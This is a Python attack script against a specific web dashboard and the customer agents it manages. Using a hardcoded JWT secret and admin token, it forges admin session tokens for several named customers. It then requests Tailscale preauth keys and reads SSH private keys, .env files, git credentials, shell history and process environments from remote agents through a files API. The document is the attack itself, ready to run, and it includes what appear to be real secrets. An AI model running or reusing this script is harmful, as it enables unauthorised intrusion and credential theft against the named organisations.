#!/usr/bin/env python3
# i28934 round2: tailscale preauth key + files read/list on online agents (esp /home/lumii carve-out)
import os, sys, json, time, base64, hmac, hashlib, subprocess, re

HOST="dashboard.lumiiai.cn"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
ADMIN_TOKEN="6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
JWT_SECRET="w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="

T0=time.time()
def el(): return int(time.time()-T0)
def _b64(s): return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v):
    s=v if isinstance(v,str) else json.dumps(v,ensure_ascii=False,default=str)
    print("R:%s:%s"%(k,_b64(s)),flush=True)

def curl(args,timeout=40):
    try:
        r=subprocess.run(["curl","-s","-k","-m",str(timeout)]+args,capture_output=True,timeout=timeout+15)
        return r.returncode,r.stdout,r.stderr
    except Exception as e:
        return -1,b"",repr(e).encode()

def call(path,method="GET",body=None,hdrs=None,timeout=40,maxlen=120000,cookie=None):
    url="https://%s%s"%(HOST,path)
    args=["--http2","-A",UA,"-H","Accept: application/json, text/plain, */*",
          "-H","Referer: https://%s/"%HOST,"-H","Origin: https://%s"%HOST,
          "-w","\n__CODE__%{http_code}"]
    hh=dict(hdrs or {})
    if cookie: hh["Cookie"]="session="+cookie
    for k,v in hh.items(): args+=["-H","%s: %s"%(k,v)]
    if body is not None:
        args+=["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
    elif method!="GET": args+=["-X",method]
    args+=[url]
    rc,out,err=curl(args,timeout=timeout)
    txt=out.decode("utf-8","replace");code="";i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3];txt=txt[:i]
    return {"code":code,"body":txt[:maxlen],"len":len(txt),"err":err.decode("utf-8","replace")[:120]}

def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def forge(payload):
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    p=b64u(json.dumps(payload,separators=(",",":")))
    sig=b64u(hmac.new(JWT_SECRET.encode(),(h+"."+p).encode(),hashlib.sha256).digest())
    return h+"."+p+"."+sig

def fil(id, action, path, cookie, tag):
    r=call("/api/agents/%s/files?action=%s&path=%s"%(id,action,path), cookie=cookie, timeout=45)
    R(tag, {"code":r["code"],"body":r["body"][:6000],"len":r["len"]})

# ---------- A. tailscale preauth key ----------
for (cs,uid,label) in [("aro","fc7c3730-4219-11f1-ac43-525400595be1","aro"),
                       ("tianyue","fc7d463f-4219-11f1-ac43-525400595be1","tianyue"),
                       ("lumii-internal","3eeda4bf-9ab8-11f1-ac43-525400595be1","lumii_internal")]:
    tok=forge({"userId":uid,"email":"probe@x","customer":cs,"role":"admin"})
    r=call("/api/tailscale/auth-key",method="POST",body={},cookie=tok,timeout=30)
    R("tailscale_%s"%label, {"code":r["code"],"body":r["body"][:1500]})

# ---------- B. files read/list on online agents ----------
TARGETS=[
  # id, owner, customer, home, files[(action,path)]
  ("agent-047f1d22","fc7c3730-4219-11f1-ac43-525400595be1","aro","BrianDev",
     [("list","/home/coder"),("read","/home/coder/.bash_history"),("read","/home/coder/.git-credentials"),
      ("read","/proc/self/environ"),("list","/home/lumii"),("read","/home/lumii/.env"),("read","/home/lumii/.ssh/id_ed25519")]),
  ("agent-03d6cf98","4509e957-4909-11f1-ac43-525400595be1","plexus","lumii1",
     [("list","/home/lumii"),("read","/home/lumii/.env"),("read","/home/lumii/.env.local"),
      ("read","/home/lumii/.ssh/id_ed25519"),("read","/home/lumii/.ssh/config"),("read","/home/lumii/.bash_history"),
      ("read","/proc/self/environ")]),
  ("agent-0cf829f4","4b4f439e-74f7-11f1-ac43-525400595be1","tianyue","tianyue_user3",
     [("list","/home/lumii"),("read","/home/lumii/.env"),("read","/home/lumii/.ssh/id_ed25519"),("read","/proc/self/environ")]),
  ("agent-8c6ac8b3","bc09d9cc-63b0-11f1-ac43-525400595be1","goldenyears","goldenyears",
     [("list","/home/lumii"),("read","/home/lumii/.env"),("read","/proc/self/environ")]),
  ("agent-10718fda","4509f57e-4909-11f1-ac43-525400595be1","plexus","intelora1",
     [("list","/home/lumii"),("read","/home/lumii/.env"),("read","/proc/self/environ")]),
]

for (aid,owner,cs,label,files) in TARGETS:
    tok=forge({"userId":owner,"email":"probe@x","customer":cs,"role":"admin"})
    al=call("/api/agents/list",cookie=tok,timeout=30,maxlen=4000)
    R("acl_%s"%label, {"code":al["code"],"body":al["body"][:600]})
    for (act,p) in files:
        safe=re.sub(r'\W','_',p)
        fil(aid,act,p,tok,"f_%s_%s_%s"%(label,act,safe))

R("done",{"elapsed":el()})
